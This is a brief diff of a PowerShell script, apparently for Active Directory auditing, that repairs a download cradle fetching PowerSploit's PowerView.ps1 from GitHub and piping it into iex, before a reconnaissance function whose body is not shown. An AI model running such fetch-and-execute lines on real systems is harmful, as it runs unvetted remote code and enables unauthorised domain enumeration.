@@ -1,4 +1,4 @@
-(new-object system.net.webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')%7Ciex
+(new-object system.net.webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')|iex
 function Invoke-DoWhatPingCastleAlreadyDidButThisTimeWithSpreadsheets {
     [CmdletBinding()]
     param(
